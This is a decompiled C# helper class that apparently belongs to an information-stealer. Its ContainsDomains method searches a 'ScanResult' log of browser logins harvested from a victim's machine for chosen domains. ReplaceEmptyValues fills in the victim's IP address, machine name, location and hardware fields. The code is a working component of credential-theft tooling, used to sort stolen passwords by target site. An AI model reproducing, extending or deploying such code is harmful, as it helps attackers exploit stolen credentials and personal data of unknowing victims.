using System;
using System.Collections.Generic;
using System.Linq;

// Token: 0x0200002F RID: 47
public static class Extensions
{
	// Token: 0x060000CB RID: 203 RVA: 0x00007CBB File Offset: 0x00005EBB
	public static IEnumerable<T> DistinctBy<T, TKey>(this IEnumerable<T> items, Func<T, TKey> property)
	{
		return from x in items.GroupBy(property)
		select x.First<T>();
	}

	// Token: 0x060000CC RID: 204 RVA: 0x00007CE8 File Offset: 0x00005EE8
	public static T ChangeType<T>(this object @this)
	{
		return (T)((object)Convert.ChangeType(@this, typeof(T)));
	}

	// Token: 0x060000CD RID: 205 RVA: 0x00007CFF File Offset: 0x00005EFF
	public static string StripQuotes(this string value)
	{
		return value.Replace("\"", string.Empty);
	}

	// Token: 0x060000CE RID: 206 RVA: 0x00007D14 File Offset: 0x00005F14
	public static bool ContainsDomains(this ScanResult log, string domains)
	{
		if (string.IsNullOrWhiteSpace(domains))
		{
			return true;
		}
		string[] array = domains.Split(new string[]
		{
			"|"
		}, StringSplitOptions.RemoveEmptyEntries);
		if (array != null && array.Length == 0)
		{
			return true;
		}
		ScanDetails scanDetails = log.ScanDetails;
		IEnumerable<Account> enumerable;
		if (scanDetails == null)
		{
			enumerable = null;
		}
		else
		{
			List<ScannedBrowser> browsers = scanDetails.Browsers;
			if (browsers == null)
			{
				enumerable = null;
			}
			else
			{
				IEnumerable<ScannedBrowser> enumerable2 = from x in browsers
				where x.Logins != null
				select x;
				if (enumerable2 == null)
				{
					enumerable = null;
				}
				else
				{
					enumerable = enumerable2.SelectMany((ScannedBrowser x) => x.Logins);
				}
			}
		}
		IEnumerable<Account> enumerable3 = enumerable;
		if (enumerable3 == null)
		{
			return false;
		}
		if (enumerable3.Count<Account>() == 0)
		{
			return false;
		}
		foreach (Account account in enumerable3)
		{
			foreach (string value in array)
			{
				if (account.URL.Contains(value))
				{
					return true;
				}
			}
		}
		return false;
	}

	// Token: 0x060000CF RID: 207 RVA: 0x00007E2C File Offset: 0x0000602C
	public static void ReplaceEmptyValues(this ScanResult log)
	{
		log.City = (log.City ?? "UNKNOWN");
		log.Country = (log.Country ?? "UNKNOWN");
		log.FileLocation = (log.FileLocation ?? "UNKNOWN");
		log.Hardware = (log.Hardware ?? "UNKNOWN");
		log.IPv4 = (log.IPv4 ?? "UNKNOWN");
		log.Language = (log.Language ?? "UNKNOWN");
		log.MachineName = (log.MachineName ?? "UNKNOWN");
		log.OSVersion = (log.OSVersion ?? "UNKNOWN");
		log.Resolution = (log.Resolution ?? "UNKNOWN");
		log.TimeZone = (log.TimeZone ?? "UNKNOWN");
		log.ZipCode = (log.ZipCode ?? "UNKNOWN");
		log.ScanDetails = (log.ScanDetails ?? new ScanDetails());
	}
}
